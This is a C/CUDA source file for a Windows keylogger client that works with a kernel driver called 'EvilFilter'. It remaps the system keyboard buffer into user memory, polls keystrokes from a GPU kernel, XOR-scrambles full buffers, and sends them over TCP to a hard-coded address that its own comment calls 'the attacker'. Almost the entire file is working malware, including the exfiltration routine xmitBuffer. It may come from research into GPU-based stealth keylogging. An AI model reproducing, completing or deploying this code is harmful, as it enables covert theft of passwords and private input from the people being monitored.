#include "stdafx.h"
#include <SharedHeader.h>
#include <stdio.h>
#include <kernelspecs.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
#include <windows.h>
#include <winbase.h>
#include <cuda.h>
#include <cuda_runtime.h>
#include "helper_cuda.h"
#include "device_launch_parameters.h"
#include <DbgEng.h>
#include <process.h>
#include <psapi.h>
#include <time.h>
#include <scancode.h>

#include <winsock.h>

#define DEBUG 1


VOID pauseForABit(WORD secondsDelay) {

	printf("Waiting for %d seconds...", secondsDelay);
	SYSTEMTIME systemTime;
	GetSystemTime(&systemTime);
	WORD ExitMinute = systemTime.wMinute;
	WORD ExitSecond = systemTime.wSecond + secondsDelay;
	while (ExitSecond > 59) {
		ExitSecond = ExitSecond - 60;
		ExitMinute = ExitMinute + 1;
	}
	while (ExitMinute > 59) {
		ExitMinute = ExitMinute - 60;
	}
	WORD CurrentMinute = systemTime.wMinute;
	WORD CurrentSecond = systemTime.wSecond;


	while (TRUE) {
		GetSystemTime(&systemTime);
		CurrentMinute = systemTime.wMinute;
		CurrentSecond = systemTime.wSecond;
		if (CurrentMinute == ExitMinute && CurrentSecond >= ExitSecond) {
			break;
		}
	}
	printf("done waiting\n");
	return;
}
__global__ void copyKeyboardBuffer(PCHAR inBuffer, PCHAR outBuffer, PULONG keystrokeIndex) {
	int index = blockIdx.x*blockDim.x + threadIdx.x;
	if (index == 0) {
		outBuffer[index] = inBuffer[index] ^ 0x65 + 1;
		*keystrokeIndex = 0;
	}
	else {
		outBuffer[index] = inBuffer[index] ^ inBuffer[index - 1] ^ index + 1;
	}
}

__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PKEYBOARD_INPUT_DATA keyboardFlag, PCHAR KeyMap, PCHAR ExtendedKeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PUSHORT shiftStatus, PULONG keystrokeIndex, PULONG previousState) {
	int index = blockIdx.x*blockDim.x + threadIdx.x;

	if (index == 0) {

		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardFlag->Flags) {

			if (*keystrokeIndex < BUFFER_SIZE) {
				CHAR key = KeyMap[keyboardData->MakeCode];
				if (keyboardFlag->Flags == SP_KEY_MAKE || keyboardFlag->Flags == SP_KEY_BREAK) {

				} 
				else if (key == INVALID) {

				}
				else if (key == ENTER) {
					cudaBuffer[(*keystrokeIndex)++] = '\n';
				}
				else if (key == LSHIFT || key == RSHIFT) {
					if (keyboardFlag->Flags == KEY_MAKE) {
						*shiftStatus = 1;
					}
					else if (keyboardFlag->Flags == KEY_BREAK) {
						*shiftStatus = 0;
					}
				}
				else if (key == CTRL) {

				}
				else if (key == ALT) {

				}
				else if (key == SPACE) {
					cudaBuffer[(*keystrokeIndex)++] = ' ';
				}
				else if (*shiftStatus == 0) {
					cudaBuffer[(*keystrokeIndex)++] = KeyMap[keyboardData->MakeCode];
				}
				else if (*shiftStatus == 1) {
					cudaBuffer[(*keystrokeIndex)++] = ExtendedKeyMap[keyboardData->MakeCode];
				}
				else {
					cudaBuffer[(*keystrokeIndex)++] = KeyMap[keyboardData->MakeCode];
				}
			}
			printf("GPU: %s [%c][0x%x] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx][0x%lx] index[%lu]\n",
				keyboardFlag->Flags == KEY_BREAK ? "Up  " : keyboardFlag->Flags == KEY_MAKE ? "Down" : "Unkn",
				KeyMap[keyboardData->MakeCode],
				keyboardData->MakeCode,
				keyboardData->UnitId,
				keyboardFlag->Flags,
				keyboardData->Reserved,
				keyboardData->ExtraInformation,
				keyboardFlag->ExtraInformation,
				*keystrokeIndex);

			*lastMake = keyboardData->MakeCode;
			*lastModifier = keyboardFlag->Flags;
				
		}
	}
}

/**
 * The overall strategy here is to make 2 calls to the driver obkect 
 * - the first is to get the offset for the pointer to the keyboard buffer
 * Then I loop through allocating variables until I get one with the correct 
 * offset.  
 * - the second call is with the pointer that has an identical offset
 * so that the driver can remap its page to the page with the keyboard buffer
 * 
 * once I have the mapped pointer I loop through the "logKeyboardData" CUDA routine 
 * to look for new keystrokes and hold them in a buffer until that buffer is filled. 
 * A full buffer is then encrypted as it is coppied via the "copyKeyboardBuffer" CUDA routine
 * The encrypted buffer is then transmitted to the attacker via a spawned thread while the 
 * original buffer goes back to listening for more keystrokes.
 */
int main(int argc, _TCHAR* argv[]) {
#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;

	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData = NULL;
		PKEYBOARD_INPUT_DATA keyboardFlag = NULL;
		PKEYBOARD_INPUT_DATA tempKeyboard;
		PSHARED_MEMORY_STRUCT dataToTransmit;
		ULONG kmdfBufferOffset;
		ULONG kmdfFlagOffset;
		BOOLEAN largeBuffer;
		BOOLEAN largeFlag;
		ULONG keyboardOffset;
		ULONG flagOffset;
		PLLIST listNode;
		
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);

		// Get the Keyboard Offset
		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;

		// Get the Buffer Offset
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
			CloseHandle(hControlDevice);
			return 1;
		}
		kmdfBufferOffset = dataToTransmit->offset;
		largeBuffer = dataToTransmit->largePage;
		printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfBufferOffset);

		// Get the Flag Offset
		dataToTransmit->instruction = 'P';
		dataToTransmit->offset = 0;
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
			CloseHandle(hControlDevice);
			return 1;
		}
		kmdfFlagOffset = dataToTransmit->offset;
		largeFlag = dataToTransmit->largePage;
		printf("Ioctl to EvilFilter device succeeded...KMDF Flag offset is [0x%lx]\nConstructing pointers.\n", kmdfFlagOffset);

		// create a pointer with the correct offset
		listNode = (PLLIST)malloc(sizeof(LLIST));
		listNode->keyboardBuffer = NULL;
		listNode->previous = NULL;

		while (!keyboardData || !keyboardFlag) {
			tempKeyboard = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
			if (largeBuffer) {
				keyboardOffset = (ULONG)tempKeyboard & 0x1fffff;
			}
			else {
				keyboardOffset = (ULONG)tempKeyboard & 0x0fff;
			}
			if (largeFlag) {
				flagOffset = (ULONG)tempKeyboard & 0x1fffff;
			}
			else {
				flagOffset = (ULONG)tempKeyboard & 0x0fff;
			}
			if (!keyboardData && keyboardOffset == kmdfBufferOffset) {
				keyboardData = tempKeyboard;
				printf("Found keyboardData [0x%lx]...", tempKeyboard);
			}
			else if (!keyboardFlag && flagOffset == kmdfFlagOffset) {
				keyboardFlag = tempKeyboard;
				printf("Found keyboardFlag [0x%lx]...", tempKeyboard);
			}
			else {
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = tempKeyboard;
				listNode->previous = previousListNode;
			}
		}

		printf("freeing unused memory...\n", keyboardData, keyboardFlag);
		while (listNode) {
			PLLIST currentListNode = listNode;
			listNode = listNode->previous;

			if (currentListNode->keyboardBuffer) {
				free(currentListNode->keyboardBuffer);
			}
			free(currentListNode);
		}

		// Get the Keyboard Buffer
		printf("fetching the KeyboardBuffer...");
		dataToTransmit->ClientMemory = keyboardData;
		dataToTransmit->instruction = 'E';
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL )) {
			printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			CloseHandle(hControlDevice);
			return 1;
		}
		printf("got it!\n\n");

		// Get the Keyboard Flag
		printf("fetching the keyboardFlag...");
		dataToTransmit->ClientMemory = keyboardFlag;
		dataToTransmit->instruction = 'F';
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			CloseHandle(hControlDevice);
			return 1;
		}
		printf("\nIoctl to EvilFilter device succeeded - we now have the real keyboard buffer.  KeyboardData=[0x%lx]\n", keyboardData);

		// now try to unhook the keyboard
		/**/
		dataToTransmit->instruction = 'U';
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device failed - unable to unhook keyboard - but that's ok.\n");
		}
		CloseHandle(hControlDevice);
		/**/


		/* send address to GPU */
		// set up GPU
		PKEYBOARD_INPUT_DATA d_KeyboardData;
		PKEYBOARD_INPUT_DATA d_KeyboardFlag;
		PCHAR d_KeyMap;
		PCHAR d_KeyMap2;
		PCHAR d_KeystrokeBuffer;
		PCHAR d_OutgoingKeystrokeBuffer;
		PCHAR h_OutgoingKeystrokeBuffer;
		PUSHORT d_lastMake;
		PUSHORT d_lastModifier;
		PUSHORT d_shiftStatus;
		PULONG d_keystrokeIndex;
		PULONG d_keyboardState;
		PULONG h_keystrokeIndex;
		USHORT init0 = 666U;
		ULONG init666long = 666LU;

		checkCudaErrors(cudaSetDevice(0));
		checkCudaErrors(cudaSetDeviceFlags(cudaDeviceMapHost));

		h_keystrokeIndex = (PULONG)malloc(sizeof(ULONG));
		*h_keystrokeIndex = 0;
		h_OutgoingKeystrokeBuffer = (PCHAR)malloc(sizeof(CHAR) * BUFFER_SIZE);

		printf("Allocating device variables...");
		checkCudaErrors(cudaMalloc(&d_lastMake,                sizeof(USHORT)));
		checkCudaErrors(cudaMalloc(&d_lastModifier,            sizeof(USHORT)));
		checkCudaErrors(cudaMalloc(&d_shiftStatus,             sizeof(USHORT)));
		checkCudaErrors(cudaMalloc(&d_keyboardState,           sizeof(ULONG)));
		checkCudaErrors(cudaMalloc(&d_KeystrokeBuffer,         sizeof(CHAR) * BUFFER_SIZE));
		checkCudaErrors(cudaMalloc((void **)&d_KeyMap,         sizeof(char) * 84));
		checkCudaErrors(cudaMalloc((void **)&d_KeyMap2,        sizeof(char) * 84));
		printf("Allocated\nZeroing out device variables...");
		checkCudaErrors(cudaMemcpy(d_lastMake,         &init0,         sizeof(USHORT),    cudaMemcpyHostToDevice));
		checkCudaErrors(cudaMemcpy(d_lastModifier,     &init0,         sizeof(USHORT),    cudaMemcpyHostToDevice));
		checkCudaErrors(cudaMemcpy(d_shiftStatus,      &init0,         sizeof(USHORT),    cudaMemcpyHostToDevice));
		checkCudaErrors(cudaMemcpy(d_keyboardState,    &init666long,   sizeof(ULONG),     cudaMemcpyHostToDevice));
		checkCudaErrors(cudaMemcpy(d_KeyMap,           KeyMap,         84 * sizeof(char), cudaMemcpyHostToDevice));	
		checkCudaErrors(cudaMemcpy(d_KeyMap2,          ExtendedKeyMap, 84 * sizeof(char), cudaMemcpyHostToDevice));	
		printf("Done.\n");

		printf("Registering KeyboardData, KeyboardFlag, OutgoingKeystrokeBuffer, and KeystrokeIndex for use by CUDA...\n");
		checkCudaErrors(cudaHostRegister(keyboardData, sizeof(KEYBOARD_INPUT_DATA), cudaHostRegisterMapped));
		checkCudaErrors(cudaHostRegister(keyboardFlag, sizeof(KEYBOARD_INPUT_DATA), cudaHostRegisterMapped));
		checkCudaErrors(cudaHostRegister(h_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE, cudaHostRegisterMapped));
		checkCudaErrors(cudaHostRegister(h_keystrokeIndex, sizeof(ULONG), cudaHostRegisterMapped));
		printf("getting device pointer for KeyboardData, KeyboardFlag, OutgoingKeystrokeBuffer, and KeystrokeIndex...\n");
		checkCudaErrors(cudaHostGetDevicePointer((void **)&d_KeyboardData, (void *)keyboardData, 0));
		checkCudaErrors(cudaHostGetDevicePointer((void **)&d_KeyboardFlag, (void *)keyboardFlag, 0));
		checkCudaErrors(cudaHostGetDevicePointer((void **)&d_OutgoingKeystrokeBuffer, (void *)h_OutgoingKeystrokeBuffer, 0));
		checkCudaErrors(cudaHostGetDevicePointer((void **)&d_keystrokeIndex, (void *)h_keystrokeIndex, 0));

		printf("Launching CUDA process.\n");
		while (TRUE) { 
			logKeyboardData <<<1, 1 >>>(d_KeyboardData, d_KeyboardFlag, d_KeyMap, d_KeyMap2, d_KeystrokeBuffer, d_lastMake, d_lastModifier, d_shiftStatus, d_keystrokeIndex, d_keyboardState);
			checkCudaErrors(cudaDeviceSynchronize());
			if (*h_keystrokeIndex >= BUFFER_SIZE) {
				printf("copying buffer.\n");
				copyKeyboardBuffer <<<32, 256 >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
				checkCudaErrors(cudaDeviceSynchronize());
				printf("sending buffer.\n"); 
				CreateThread(NULL, 0, xmitBuffer, (LPVOID)h_OutgoingKeystrokeBuffer, 0, NULL);
			}
		}
	}
	return 0;
}



DWORD WINAPI xmitBuffer(LPVOID voidPointer) {
	int sock;
	struct sockaddr_in echoServAddr;
	USHORT echoServPort = 7;
	PCHAR servIP = "192.168.0.122";
	int echoStringLen;
	WSADATA wsaData;

	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
		fprintf(stderr, "WSAStartup() failed");
		return 1;
	}
	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		fprintf(stderr, "socket() failed");
		return 1;
	}

	memset(&echoServAddr, 0, sizeof(echoServAddr));
	echoServAddr.sin_family = AF_INET;
	echoServAddr.sin_addr.s_addr = inet_addr(servIP);
	echoServAddr.sin_port = htons(echoServPort);
	if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0) {
		fprintf(stderr, "connect() failed");
		return 1;
	}
	PCHAR echoString = (PCHAR)voidPointer;
	echoStringLen = strlen(echoString);
	send(sock, echoString, echoStringLen, 0);
	closesocket(sock);
	WSACleanup();

	return 0;
}



